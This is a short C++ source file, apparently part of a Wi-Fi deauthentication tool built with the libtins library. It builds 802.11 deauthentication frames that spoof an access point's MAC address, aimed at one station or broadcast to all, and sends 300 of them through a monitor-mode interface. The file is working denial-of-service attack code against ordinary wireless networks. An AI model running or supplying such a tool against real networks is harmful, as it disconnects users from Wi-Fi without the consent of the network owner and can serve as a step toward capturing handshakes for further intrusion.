#include "deauth.h"

using namespace std;
using namespace Tins;

/* help pages */
void usage(char *pname) {
    cout << "Help: " << pname << " -h" << endl;
    cout << "Usage: " << pname << " <interface name> <ap mac> [<static mac>]" << endl;
    cout << "Usage: " << pname << " mon0 00:11:22:33:44:55 [AA:BB:CC:DD:EE:FF]" << endl;
    exit(0);
}

/* setting address (Uni Casting) */
void deauth::setAddr(Dot11::address_type dst_mac, Dot11::address_type src_mac) {
    /* Destination(Station) mac */
    _deauth.addr1(dst_mac);
    /* Source mac(AP) */
    _deauth.addr2(src_mac);
    _deauth.addr3(_deauth.addr2());
}

/* setting address (Broad Casting) */
void deauth::setAddr(Dot11::address_type src_mac) {
    /* Destination(Station) mac */
    _deauth.addr1(Dot11::BROADCAST);
    /* Source mac(AP) */
    _deauth.addr2(src_mac);
    _deauth.addr3(_deauth.addr2());
}

/* send deauthentication packet */
void deauth::sendDeAuth(char *intface) const {
    RadioTap pkt = RadioTap() / _deauth;
    PacketSender sender;
    NetworkInterface iface(intface);
    for (int i=0; i<300; i++)
        sender.send(pkt, iface);
    cout << "[*] Success - Send Packet~!!!" << endl;
}
